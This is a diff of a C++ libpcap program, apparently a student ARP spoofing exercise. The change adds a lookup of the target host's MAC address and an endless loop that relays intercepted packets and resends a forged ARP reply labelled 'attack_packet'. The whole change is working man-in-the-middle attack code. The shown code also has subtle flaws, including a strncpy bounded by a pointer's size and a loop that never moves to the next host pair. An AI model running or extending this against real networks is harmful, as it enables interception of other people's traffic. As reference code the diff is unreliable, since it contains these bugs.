@@ -1,5 +1,4 @@
 #include <cstdio>
-#include <iostream>
 #include <pcap.h>
 #include "ethhdr.h"
 #include "arphdr.h"
@@ -17,7 +16,6 @@ int main(int argc, char* argv[]) {
 	}
 
 	int count = (argc - 1) / 2;
-
 	for (int i = 0; i < count; i++) {
 		char dev[10];
 		strncpy(dev, argv[1], sizeof(argv[1]));
@@ -27,7 +25,6 @@ int main(int argc, char* argv[]) {
 
 		Mac source_mac = get_source_mac(dev);
 		Ip source_ip = get_source_ip(dev);
-
 
 		char errbuf[PCAP_ERRBUF_SIZE];
 		pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
@@ -40,6 +37,10 @@ int main(int argc, char* argv[]) {
 																		htons(ArpHdr::Request), source_mac, htonl(source_ip),
 																		Mac("00:00:00:00:00:00"), htonl(sender_ip));
 
+		Mac target_mac = get_mac_adress(handle, Mac("ff:ff:ff:ff:ff:ff"), source_mac,
+																		htons(ArpHdr::Request), source_mac, htonl(source_ip),
+																		Mac("00:00:00:00:00:00"), htonl(target_ip));
+
 		EthArpPacket attack_packet = config_packet(sender_mac, source_mac, htons(ArpHdr::Reply),
 																								source_mac, htonl(target_ip),
 																								sender_mac, htonl(sender_ip));
@@ -47,6 +48,15 @@ int main(int argc, char* argv[]) {
 		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		}
+
+		while (true) {
+			if (relay_packet(handle, source_mac, sender_mac, target_mac) == -1) {
+				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
+				if (res != 0) {
+					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+				}
+			}
 		}
 
 		pcap_close(handle);
